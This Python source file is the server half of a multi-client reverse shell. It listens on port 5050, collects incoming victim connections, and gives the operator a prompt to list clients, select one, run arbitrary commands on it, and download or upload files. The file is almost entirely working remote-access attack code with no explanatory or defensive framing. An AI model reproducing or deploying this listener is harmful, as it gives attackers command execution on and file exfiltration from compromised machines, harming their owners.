import socket
import sys
import threading
import time
from queue import Queue

NB_THREAD = 2
JOB_THREAD = [1, 2]  # JOB Thread 1 : listen for connection and accept connection | JOB Thread 2 : Handling connection

BUFFER = 1024
queue = Queue()
all_connections = []
all_address = []


# Create a socket
def create_socket():
    try:
        global host
        host = ""
        global port
        port = 5050
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error() as msg:
        print("Socket creation error : " + str(msg))


# Binding and listening
def bind_socket(host, port, s):
    try:
        s.bind((host, port))
        print("Binding port : " + str(port))
        s.listen(5)

    except socket.error() as msg:
        print("Socket binding error : " + str(msg) + "Retrying...")
        bind_socket(host, port, s)


# Thread 1 : Handling connections from multiple client and saving in list
def accept_client():
    # closing previous connections and empty list
    for i in all_connections:
        i.close()

    del all_connections[:]
    del all_address[:]

    while True:
        try:

            conn, address = s.accept()
            s.setblocking(1)  # prevents timeout
            all_connections.append(conn)
            all_address.append(address)

            print("Connection established at : " + address[0])
        except:
            print("[Error accepting connection]")


# Thread 2 : see all clients, select a client, sending commands to a connected client
def start_prompt():
    # creating our own shell prompt with 2 possible commands (list and select)
    while True:
        cmd = input(">>")
        if cmd == "list":
            list_connections()  # display all clients connected

        elif cmd == 'quit':
            break


        elif 'select' in cmd:
            conn = get_target(cmd)  # select a client to send commands
            if conn is not None:  # if client exist
                send_commands(conn)  # send him commands


        else:
            print("Command not recognized")


def download(conn):
    # etre dans bon repertoire
    try:

        filename = input("Filename : ")
        f = open(filename, 'wb')
        conn.send(str.encode(filename))
        print("Start...")
        i = conn.recv(BUFFER)
    except:
        print("File not found...")

    while not ('Complete' in str(i)):
        f.write(i)
        i = conn.recv(BUFFER)

    f.close()
    print("Completed...")


def upload(conn, cmd):
    try:

        filename = cmd[7:]

        f = open(filename, 'rb')
        i = f.read(BUFFER)
        print("Start...")

    except:
        print("File not exist...")

    while i:
        conn.send(i)
        i = f.read(BUFFER)

    f.close()
    conn.send(b'Complete')
    print("Completed...")


def list_connections():
    res = ''

    # enumerate enable to indexing list's items
    for i, conn in enumerate(all_connections):
        try:  # checking if the client if connected
            conn.send(str.encode(' '))
            conn.recv(BUFFER)

        except:
            # remove client not connected from lists
            del all_connections[i]
            del all_address[i]
            continue  # continue ignore the following code part of the "for" and get back to the next iteration

        res = str(i) + " " + str(all_address[i][0]) + " " + str(all_address[i][1]) + "\n"
        # print ID + IP + Port per clients connected

        print("---Clients---\n" + res)


def get_target(cmd):
    try:

        target = cmd.replace('select ', '')
        target = int(target)  # get the select ID
        conn = all_connections[target]  # select connection object from the list
        print("You are now connected to " + str(all_address[target][0]))
        print(str(all_address[target][0]) + ">", end="")
        return conn  # return connection object of the selected client
    except:
        print("select ID not valid")
        return None


def send_commands(conn):
    while True:
        try:
            cmd = input(">>")
            if cmd == 'quit':
                break

            if cmd == 'download':
                conn.send(str.encode(cmd))
                download(conn)

            if cmd[:6] == 'upload':
                conn.send(str.encode(cmd))
                upload(conn, cmd)

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_resp = conn.recv(BUFFER).decode("utf-8")
                print(client_resp, end="")

        except:
            print("[Error sending commands]...")


# create threads
def create_workers():
    for _ in range(NB_THREAD):
        t = threading.Thread(target=work)
        t.daemon = True  # del thread into the memory after used
        t.start()


def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket(host, port, s)
            accept_client()
        if x == 2:
            start_prompt()

        queue.task_done()


def create_jobs():
    for i in JOB_THREAD:
        queue.put(i)

    queue.join()


create_workers()
create_jobs()
